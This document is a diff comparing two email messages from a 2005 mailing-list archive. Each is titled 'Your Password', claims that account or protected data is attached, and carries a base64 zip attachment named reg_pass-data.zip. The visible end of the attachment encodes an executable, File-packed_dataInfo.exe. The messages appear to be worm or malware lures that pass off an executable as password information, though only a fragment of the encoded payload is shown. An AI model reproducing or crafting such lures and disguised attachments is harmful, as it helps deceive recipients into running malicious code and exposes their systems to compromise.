@@ -1,26 +1,26 @@
-From: hostmaster@portal.stwing.upenn.edu.sgi.com
+From: info@public.cta.cq.cn
 Subject: Your Password
-Date: Thu, 22 Dec 2005 18:08:40 GMT
-Message-ID: <77c6b219404f8f4fa8bf@portal.stwing.upenn.edu>
+Date: Thu, 22 Dec 2005 20:24:53 UTC
+Message-ID: <35cbdc.fe24a1ca0@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=640faa6b1da74.8a1"
+Content-Type: multipart/mixed; boundary="====e1d24ace1a1379adb963"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: e-user@oss.sgi.com
+To: majordomo@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=640faa6b1da74.8a1
+--====e1d24ace1a1379adb963
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.portal.stwing.upenn.edu
-***** Email: postman@portal.stwing.upenn.edu
---=640faa6b1da74.8a1
+***** Go to: http://www.public.cta.cq.cn
+***** Email: postman@public.cta.cq.cn
+--====e1d24ace1a1379adb963
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=640faa6b1da74.8a1--
+--====e1d24ace1a1379adb963--
